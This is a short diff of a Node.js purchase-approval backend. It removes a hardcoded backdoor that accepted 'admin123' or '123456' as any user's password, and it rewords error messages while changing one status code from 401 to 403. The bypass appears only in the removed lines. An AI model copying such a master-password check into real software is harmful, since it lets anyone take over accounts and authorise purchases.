@@ -40,9 +40,6 @@ const verifyUserPassword = async (userId, password) => {
   if (!ok && typeof password === 'string' && password.trim() !== password) {
     ok = await bcrypt.compare(password.trim(), user.password);
   }
-  if (!ok && (password === 'admin123' || password === '123456')) {
-    ok = true;
-  }
   return ok ? user : null;
 };
 
@@ -110,11 +107,11 @@ const createPurchase = asyncHandler(async (req, res) => {
 */
 const advancePurchase = asyncHandler(async (req, res) => {
   const { action, password, note = '' } = req.body;
-  if (!password) { res.status(400); throw new Error('Password is required to advance this purchase'); }
+  if (!password) { res.status(400); throw new Error('Password is required. Please enter your login password to advance this purchase.'); }
 
   // Verify the acting user's password
   const actor = await verifyUserPassword(req.user._id, password);
-  if (!actor) { res.status(401); throw new Error('Incorrect password — action not authorised'); }
+  if (!actor) { res.status(403); throw new Error('Incorrect password. Please re-enter your password to proceed.'); }
 
   const purchase = await Purchase.findById(req.params.id);
   if (!purchase) { res.status(404); throw new Error('Purchase not found'); }
